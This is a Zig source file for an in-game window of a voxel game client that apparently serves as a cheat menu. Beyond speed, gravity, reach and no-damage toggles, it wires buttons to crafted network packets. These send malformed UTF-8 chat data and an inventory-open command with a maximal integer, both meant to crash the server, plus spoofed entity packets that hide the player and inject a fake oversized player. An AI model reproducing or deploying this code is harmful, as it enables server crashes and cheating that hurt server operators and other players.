const std = @import("std");

const main = @import("main");
const blocks = main.blocks;
const mesh_storage = main.renderer.mesh_storage;
const settings = main.settings;
const Vec2f = main.vec.Vec2f;
const Vec3i = main.vec.Vec3i;
const Inventory = main.items.Inventory;

const gui = @import("../gui.zig");
const GuiComponent = gui.GuiComponent;
const GuiWindow = gui.GuiWindow;
const Button = @import("../components/Button.zig");
const CheckBox = @import("../components/CheckBox.zig");
const ContinuousSlider = @import("../components/ContinuousSlider.zig");
const DiscreteSlider = @import("../components/DiscreteSlider.zig");
const VerticalList = @import("../components/VerticalList.zig");

pub var window = GuiWindow{
	.contentSize = Vec2f{128, 256},
	.closeIfMouseIsGrabbed = true,
};

const padding: f32 = 8;

fn speedCallback(newValue: f32) void {
	settings.speed = @exp2(newValue);
	settings.save();
}

fn speedFormatter(allocator: main.heap.NeverFailingAllocator, value: f32) []const u8 {
	return std.fmt.allocPrint(allocator.allocator, "#ffffffSpeed: {d:.2}", .{@exp2(value)}) catch unreachable;
}

fn gravityCallback(newValue: f32) void {
	settings.gravity = @exp2(newValue);
	settings.save();
}

fn infiniteReachCallback(newValue: bool) void {
	settings.infiniteReach = newValue;
	settings.save();
}

fn cubeezusCallback(newValue: bool) void {
	settings.cubeezus = newValue;
	settings.save();
}
fn noDamageCallback(newValue: bool) void {
	settings.noDamage = newValue;
	settings.save();
}

fn gravityFormatter(allocator: main.heap.NeverFailingAllocator, value: f32) []const u8 {
	return std.fmt.allocPrint(allocator.allocator, "#ffffffGravity multiplier: {d:.2}", .{@exp2(value)}) catch unreachable;
}

fn crashCallback(_: usize) void {
	const data = "\xf8\xa1\xa1\xa1\xa1\xfc\xa1\xa1\xa1\xa1\xa1\xe2\x82\x28\xe2\x28\xa1\xc3\x28\xf0\x28\x8c\x28";
	main.network.Protocols.chat.send(main.game.world.?.conn, data);
}

fn becomeInvisibleCallback(_: usize) void {
	const zonArray = main.ZonElement.initArray(main.stackAllocator);
	defer zonArray.deinit(main.stackAllocator);
	zonArray.array.append(.{.int = main.game.Player.id});
	const data = zonArray.toStringEfficient(main.stackAllocator, &.{});
	defer main.stackAllocator.free(data);
	main.network.Protocols.entity.send(main.game.world.?.conn, data);
}

fn createPlayerCallback(_: usize) void {
	const zonArray = main.ZonElement.initArray(main.stackAllocator);
	defer zonArray.deinit(main.stackAllocator);
	const zonObject = main.ZonElement.initObject(main.stackAllocator);
	zonObject.put("id", @as(u32, 999));
	zonObject.put("width", 20.0);
	zonObject.put("height", 20.0);
	zonObject.put("name", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
	zonArray.array.append(zonObject);
	const data = zonArray.toStringEfficient(main.stackAllocator, &.{});
	defer main.stackAllocator.free(data);
	main.network.Protocols.entity.send(main.game.world.?.conn, data);
}

fn superBounceCallback(newValue: bool) void {
	settings.superBounce = newValue;
	settings.save();
}

fn setSpawnCallback(newValue: bool) void {
	settings.setSpawn = newValue;
	settings.save();
}

fn crashOpenInventoryCallback(_: usize) void {

	var writer = main.utils.BinaryWriter.init(main.stackAllocator);
	defer writer.deinit();

	writer.writeEnum(Inventory.Command.PayloadType, Inventory.Command.PayloadType.open);

	writer.writeEnum(Inventory.InventoryId, Inventory.Sync.ClientSide.nextId());
	writer.writeInt(usize, std.math.maxInt(usize));
	writer.writeEnum(Inventory.TypeEnum, Inventory.TypeEnum.normal);
	writer.writeEnum(Inventory.SourceType, Inventory.SourceType.blockInventory);
	writer.writeVec(Vec3i, .{0, 0, 0});

	main.game.world.?.conn.send(.fast, main.network.Protocols.inventory.id, writer.data.items);
}

pub fn onOpen() void {
	const list = VerticalList.init(.{padding, 16 + padding}, 300, 16);
	list.add(ContinuousSlider.init(.{0, 0}, 128, -5.0, 5.0, @log2(settings.speed), &speedCallback, &speedFormatter));
	list.add(ContinuousSlider.init(.{0, 0}, 128, -10.0, 4.0, @log2(settings.gravity), &gravityCallback, &gravityFormatter));
	list.add(CheckBox.init(.{0, 0}, 128, "Infinite reach", main.settings.infiniteReach, &infiniteReachCallback));
	list.add(CheckBox.init(.{0, 0}, 128, "Cubeezus", main.settings.cubeezus, &cubeezusCallback));
	list.add(CheckBox.init(.{0, 0}, 128, "No Damage", main.settings.noDamage, &noDamageCallback));
	list.add(CheckBox.init(.{0, 0}, 128, "Super bounce", main.settings.superBounce, &superBounceCallback));
	list.add(CheckBox.init(.{0, 0}, 128, "Set Spawn", main.settings.setSpawn, &setSpawnCallback));
	list.add(Button.initText(.{0, 0}, 128, "Disappear", .{.callback = &becomeInvisibleCallback}));
	list.add(Button.initText(.{0, 0}, 128, "Open Inventory", .{.callback = &crashOpenInventoryCallback}));
	list.add(Button.initText(.{0, 0}, 128, "Create player", .{.callback = &createPlayerCallback}));
	list.add(Button.initText(.{0, 0}, 128, "Evil button (Do not press)", .{.callback = &crashCallback}));
	list.finish(.center);
	window.rootComponent = list.toComponent();
	window.contentSize = window.rootComponent.?.pos() + window.rootComponent.?.size() + @as(Vec2f, @splat(padding));
	gui.updateWindowPositions();
}

pub fn onClose() void {
	if(window.rootComponent) |*comp| {
		comp.deinit();
	}
}
